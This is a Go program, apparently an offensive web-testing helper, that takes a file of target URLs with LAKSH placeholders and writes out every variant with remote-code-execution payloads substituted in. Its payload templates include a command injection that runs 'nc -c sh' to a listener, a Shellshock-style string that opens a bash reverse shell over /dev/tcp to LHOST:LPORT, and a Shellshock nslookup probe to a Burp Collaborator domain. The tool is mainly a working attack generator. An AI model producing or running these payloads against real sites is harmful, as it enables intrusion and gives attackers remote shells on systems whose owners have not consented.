package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var (
	inFile  string
	outFile string
	mode    string // "all" or "single"

	lhost   string
	lport   string
	collab  string

	lakshRe = regexp.MustCompile(`LAKSH(\d+)`)
)

// URL-encoded payload templates with tokens {LHOST}, {LPORT}, {COLLAB}
var payloadTemplates = []string{
	`;%20nc%20-c%20sh%20{LHOST}%20{LPORT}`,
	`()%20{%20:;%20};%20/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/{LHOST}/{LPORT}%200>&1'`,
	`()%20{%20:;%20};%20/bin/nslookup%20{COLLAB}`,
}

func main() {
	flag.StringVar(&inFile, "f", "", "Input file with URLs containing LAKSH1..N placeholders (one per line)")
	flag.StringVar(&outFile, "o", "", "Optional output file override (defaults to rcesh_{target}.txt)")
	flag.StringVar(&mode, "mode", "all", "insertion mode: all (replace all placeholders per payload) | single (replace one at a time)")
	flag.Parse()

	if inFile == "" {
		fmt.Println("Usage: go run inserter.go -f params_target.com.txt [-o out.txt] [-mode all|single]")
		os.Exit(1)
	}

	// Prompt tokens
	lhost = promptIfEmpty("Enter LHOST (listener IP or host): ", lhost)
	lport = promptIfEmpty("Enter LPORT (listener port): ", lport)
	collab = promptIfEmpty("Enter Burp Collaborator domain (e.g., abc.oastify.com): ", collab)

	lines, err := readLines(inFile)
	if err != nil {
		fmt.Printf("Error reading input: %v\n", err)
		os.Exit(1)
	}

	target := inferTarget(lines)
	if outFile == "" {
		if target == "" {
			target = "target"
		}
		outFile = fmt.Sprintf("rcesh_%s.txt", sanitizeFilename(target))
	}

	out, err := os.Create(outFile)
	if err != nil {
		fmt.Printf("Error creating output file: %v\n", err)
		os.Exit(1)
	}
	defer out.Close()

	totalIn := 0
	totalOut := 0

	for _, raw := range lines {
		line := strings.TrimSpace(raw)
		if line == "" {
			continue
		}
		totalIn++

		// Skip if no LAKSH placeholder
		if !strings.Contains(line, "LAKSH") {
			continue
		}

		switch mode {
		case "single":
			// One-at-a-time per placeholder per payload
			idxs := findLakshIndices(line)
			if len(idxs) == 0 {
				continue
			}
			for _, pos := range idxs {
				for _, tpl := range payloadTemplates {
					payload := expandTokens(tpl, lhost, lport, collab)
					variant := replaceLakshAtIndex(line, pos, payload)
					emit(out, variant)
					totalOut++
				}
			}
		default: // "all"
			// Replace every LAKSH with the same payload for each payload template
			for _, tpl := range payloadTemplates {
				payload := expandTokens(tpl, lhost, lport, collab)
				variant := replaceAllLaksh(line, payload)
				emit(out, variant)
				totalOut++
			}
		}
	}

	fmt.Printf("Processed %d input lines. Wrote %d variants to %s\n", totalIn, totalOut, outFile)
}

func emit(w *os.File, s string) {
	// Validate URL structure lightly; still write even if parse error (to keep payloads intact)
	if _, err := url.Parse(s); err != nil {
		_, _ = w.WriteString(s + "\n")
		return
	}
	_, _ = w.WriteString(s + "\n")
}

func promptIfEmpty(prompt, cur string) string {
	if strings.TrimSpace(cur) != "" {
		return cur
	}
	fmt.Print(prompt)
	reader := bufio.NewReader(os.Stdin)
	val, _ := reader.ReadString('\n')
	return strings.TrimSpace(val)
}

func readLines(p string) ([]string, error) {
	f, err := os.Open(p)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	buf := make([]byte, 0, 256*1024)
	sc.Buffer(buf, 2*1024*1024)
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	return lines, sc.Err()
}

func inferTarget(lines []string) string {
	for _, s := range lines {
		u, err := url.Parse(strings.TrimSpace(s))
		if err == nil && u.Host != "" {
			return u.Host
		}
	}
	return ""
}

func sanitizeFilename(name string) string {
	name = strings.ReplaceAll(name, string(filepath.Separator), "_")
	name = strings.ReplaceAll(name, ":", "_")
	return name
}

func findLakshIndices(s string) []int {
	out := []int{}
	locs := lakshRe.FindAllStringIndex(s, -1)
	for _, loc := range locs {
		if len(loc) == 2 {
			out = append(out, loc[0])
		}
	}
	return out
}

// Replace only the occurrence whose start index equals targetIdx
func replaceLakshAtIndex(s string, targetIdx int, payload string) string {
	locs := lakshRe.FindAllStringIndex(s, -1)
	if len(locs) == 0 {
		return s
	}
	var b strings.Builder
	prev := 0
	for _, loc := range locs {
		start, end := loc[0], loc[1]
		b.WriteString(s[prev:start])
		if start == targetIdx {
			b.WriteString(payload)
		} else {
			b.WriteString(s[start:end])
		}
		prev = end
	}
	b.WriteString(s[prev:])
	return b.String()
}

// Replace every LAKSHk occurrence with the payload
func replaceAllLaksh(s, payload string) string {
	return lakshRe.ReplaceAllStringFunc(s, func(_ string) string {
		return payload
	})
}

func expandTokens(tpl, host, port, collaborator string) string {
	x := strings.ReplaceAll(tpl, "{LHOST}", url.PathEscape(host))
	x = strings.ReplaceAll(x, "{LPORT}", url.PathEscape(port))
	c := strings.TrimSpace(collaborator)
	c = strings.TrimPrefix(c, "http://")
	c = strings.TrimPrefix(c, "https://")
	x = strings.ReplaceAll(x, "{COLLAB}", c)
	return x
}
